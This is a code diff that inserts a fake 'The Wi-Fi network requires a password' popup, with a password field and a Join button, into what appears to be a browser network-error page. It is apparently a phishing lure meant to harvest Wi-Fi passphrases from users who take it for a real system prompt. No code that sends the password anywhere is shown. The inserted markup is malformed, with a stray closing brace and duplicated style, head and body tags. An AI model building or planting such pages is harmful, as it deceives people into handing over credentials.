@@ -568,6 +568,53 @@ whereas Blink does not. */
     filter: invert(0.6);
   }
 }
+  .form-popup {
+    position: fixed;
+    top: 20%;
+    left: 50%;
+    -webkit-transform: translate(-50%, -50%);
+    transform: translate(-50%, -50%);
+    height: 20%;
+    width: 30%;
+    text-align: center;
+    background-color: #e8e8e8;
+  }
+
+  img {
+    float: left; 
+    display: block;
+    margin-left: 20px;
+    margin-top: 20px;
+  }
+
+  .pwd {
+    border: 1px solid #4195fc;
+    -webkit-border-radius: 4px;
+       -moz-border-radius: 4px;
+            border-radius: 4px;
+    -webkit-box-shadow: 0px 0px 4px #4195fc;
+       -moz-box-shadow: 0px 0px 4px #4195fc;
+            box-shadow: 0px 0px 4px #4195fc;
+  }
+
+}
+
+</style>
+</head>
+
+<!-- wifi login box -->
+<body id="login" style="font-family: system-ui, sans-serif; font-size: 75%">
+<div class="form-popup" id="myForm">
+    <img src="/wifi-icon.png">
+    <p><b>The Wi-Fi network requires a password:</b></p>
+
+    <label for="psw">Password: </label>
+    <input id="pwd" type="password" name="psw" required>
+    <button type="submit" class="btn">Join</button>
+    
+</div>
+</body>
+
 </style>
 </head>
 <body id="t" style="font-family: system-ui, sans-serif; font-size: 75%" jstcache="0">
